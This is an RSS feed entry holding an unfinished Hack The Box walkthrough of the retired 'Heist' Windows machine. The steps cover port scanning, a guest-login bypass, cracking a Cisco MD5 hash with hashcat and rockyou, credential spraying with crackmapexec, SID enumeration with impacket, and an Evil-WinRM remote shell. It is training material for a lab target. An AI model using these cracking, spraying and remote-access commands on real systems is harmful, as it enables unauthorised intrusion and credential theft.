<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="//purl.org/dc/elements/1.1/" xmlns:content="//purl.org/rss/1.0/modules/content/" xmlns:atom="//www.w3.org/2005/Atom" version="2.0" xmlns:media="//search.yahoo.com/mrss/"><channel><title><![CDATA[windows - Inês Martins | Security Notes]]></title><description><![CDATA[Thoughts, stories and ideas.]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>windows - Inês Martins | Security Notes</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sun, 07 Jun 2020 21:23:27 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//tag/windows/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Walkthrough | Heist]]></title><description><![CDATA[<p>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/201">here</a>.</p><p>1. After doing an initial scan with <strong>nmap</strong>, we find 3 exposed services: a web server on port 80, RPC on port 135 and SMBv2 on port 445.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/heist/img1.png" class="kg-image"></figure><p>2. After trying and failing to acess the <strong>SMB</strong> service with null credentials, I moved on</p>]]></description><link>https://inesmartins.github.io//htb-walkthrough-heist/</link><guid isPermaLink="false">5edd2e3464e6e34f1b3f7f68</guid><category><![CDATA[windows]]></category><category><![CDATA[smb]]></category><category><![CDATA[smbv2]]></category><category><![CDATA[kali]]></category><category><![CDATA[cisco]]></category><category><![CDATA[rockyou]]></category><category><![CDATA[hashcat]]></category><category><![CDATA[impacket]]></category><category><![CDATA[crackmapexec]]></category><category><![CDATA[evil-winrm]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 18:19:05 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/heist.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/heist.png" alt="HTB Walkthrough | Heist"><p>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/201">here</a>.</p><p>1. After doing an initial scan with <strong>nmap</strong>, we find 3 exposed services: a web server on port 80, RPC on port 135 and SMBv2 on port 445.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/heist/img1.png" class="kg-image" alt="HTB Walkthrough | Heist"></figure><p>2. After trying and failing to acess the <strong>SMB</strong> service with null credentials, I moved on to the web server.</p><!--kg-card-begin: markdown--><pre><code>smbclient -L heist.htb
Enter WORKGROUP\root's password:
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<!--kg-card-end: markdown--><p><strong>root@kali:/#</strong> </p><p>3. Wappalyzer gives us a nice overview of this server.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/heist/img2.png" class="kg-image" alt="HTB Walkthrough | Heist"></figure><p>4. The initial page redirects to the <a href="//heist.htb/login.php">login</a> page.<br>After poking around for a bit we realize that by adding <a href="//heist.htb/login.php?guest=true">guest=true</a> as a query parameter, we're redirected to an <a href="//heist.htb/issues.php">issues</a> page.<br>On this page, there is what looks like a conversation between a user named Hazard and a member of the support team for a Cisco router.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/heist/img3.png" class="kg-image" alt="HTB Walkthrough | Heist"></figure><p>5. Hazard was kind enough to provide us with a configuration file for their router, which is hosted at <a href="//heist.htb/attachments/config.txt">//heist.htb/attachments/config.txt</a>.<br>Unfortunately, we can't access other attachments which would have been interesting, so let's go throug the config file.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/imgs/heist/img4.png" class="kg-image" alt="HTB Walkthrough | Heist"></figure><p>6. This config file contains:</p><ul><li>2 user passwords encrypted with a <a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html">weak algorithm</a> (7) which can be <a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">easily cracked</a>;</li><li>the <em>enable secret</em> password, which is an MD5 hash.</li></ul><p>7. To crack the MD5 hash we use <a href="https://hashcat.net/hashcat/">hashcat</a> combined with the RockYou list, which we'll filter by words &gt;= 12 chars, since the config file let's us know that this router's passwords are at least 12 chars long.</p><!--kg-card-begin: markdown--><pre><code>$ hashcat -a 0 -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' rockyou_12andabove.txt
</code></pre>
<!--kg-card-end: markdown--><p>where:</p><ul><li>-a 0 = "straight" attack-mode</li><li>-m 500 = Cisco-IOS $1$ (MD5) hash type</li></ul><p>8. Now that we know Hazard's router's password, we're going to use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to try and login as Hazard on the machine</p><!--kg-card-begin: markdown--><pre><code>$  crackmapexec heist.htb -u Hazard -p xxx
...
CME heist.htb:445 SUPPORTDESK [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME heist.htb:445 SUPPORTDESK [+] SUPPORTDESK\Hazard:xxx
</code></pre>
<!--kg-card-end: markdown--><p>9. So, we know now that the machine is a Windows 10, that it's a part of the SUPPORTDESK domain, and that the credentials we found are valid.<br>To enumerate the domain's users, we're going to use <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>.</p><!--kg-card-begin: markdown--><pre><code>$ python impacket/build/scripts-2.7/lookupsid.py SUPPORTDESK/Hazard:xxx@heist.htb

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at heist.htb
[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
</code></pre>
<!--kg-card-end: markdown--><p>10. So, let's create a file with all the users we know about and a file with the 3 passwords we cracked and let's see what works:</p><!--kg-card-begin: markdown--><pre><code>$ crackmapexec heist.htb -d SUPPORTDESK -u users.txt -p passwords.txt
</code></pre>
<!--kg-card-end: markdown--><p>P.S. According to crackmapexec's manual the -u option should allow a file to be passed as an argument, but this didn't work so I had to test each user individually.</p><p>11. We find that one of the credentials are valid for Chase, so let's try to establish a remote connection for that user with <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ruby evil-winrm/evil-winrm.rb -i heist.htb -u Chase -p 'xxx'
Evil-WinRM shell v1.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
</code></pre>
<!--kg-card-end: markdown--><p>12. The user's flag is on the Dektop!</p><p>13. TBC</p>]]></content:encoded></item></channel></rss>